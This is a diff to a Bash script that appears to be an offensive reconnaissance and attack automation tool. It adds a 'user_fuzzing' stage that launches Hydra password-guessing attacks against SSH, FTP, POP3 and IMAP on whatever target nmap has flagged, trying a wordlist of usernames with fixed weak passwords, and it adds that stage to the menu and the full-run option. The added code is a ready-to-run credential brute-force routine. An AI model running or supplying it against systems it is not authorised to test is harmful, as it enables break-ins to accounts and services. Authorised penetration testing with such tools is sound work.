@@ -142,6 +142,42 @@ auto_attacks() {
     echo -e "${GREEN}[✔] Offensive checks completed. Output saved in: $ATTACK_DIR${NC}"
 }
 
+# ------------ FASE 5: Fuzzing Users with Hydra ------------
+user_fuzzing() {
+    echo -e "${YELLOW}[*] Starting user fuzzing on detected services...${NC}"
+    FUZZ_DIR="$TARGET/5_creds/fuzz"
+    mkdir -p "$FUZZ_DIR"
+
+    USERLIST="/usr/share/wordlists/nmap.lst"  # Puedes usar users.txt o preparar uno más agresivo
+
+    # SSH
+    if grep -q "ssh" "$TARGET/2_scan/nmap_services.txt"; then
+        echo -e "${BLUE}[+] SSH detected. Fuzzing users...${NC}"
+        hydra -L "$USERLIST" -p test123 ssh://$TARGET -o "$FUZZ_DIR/ssh_user_fuzz.txt"
+    fi
+
+    # FTP
+    if grep -q "ftp" "$TARGET/2_scan/nmap_services.txt"; then
+        echo -e "${BLUE}[+] FTP detected. Fuzzing users...${NC}"
+        hydra -L "$USERLIST" -p ftp ftp://$TARGET -o "$FUZZ_DIR/ftp_user_fuzz.txt"
+    fi
+
+    # POP3
+    if grep -q "pop3" "$TARGET/2_scan/nmap_services.txt"; then
+        echo -e "${BLUE}[+] POP3 detected. Fuzzing users...${NC}"
+        hydra -L "$USERLIST" -p pop pop3://$TARGET -o "$FUZZ_DIR/pop3_user_fuzz.txt"
+    fi
+
+    # IMAP
+    if grep -q "imap" "$TARGET/2_scan/nmap_services.txt"; then
+        echo -e "${BLUE}[+] IMAP detected. Fuzzing users...${NC}"
+        hydra -L "$USERLIST" -p imap imap://$TARGET -o "$FUZZ_DIR/imap_user_fuzz.txt"
+    fi
+
+    echo -e "${GREEN}[✔] Fuzzing completed. Results saved in $FUZZ_DIR${NC}"
+}
+
+
 # ------------ MAIN MENU LOOP ------------
 while true; do
     echo
@@ -159,7 +195,9 @@ while true; do
         2) port_scanning ;;
         3) service_enum ;;
         4) auto_attacks ;;
-        5)
+        5) user_fuzzing ;;
+        6)
+            user_fuzzing
             passive_recon
             port_scanning
             service_enum
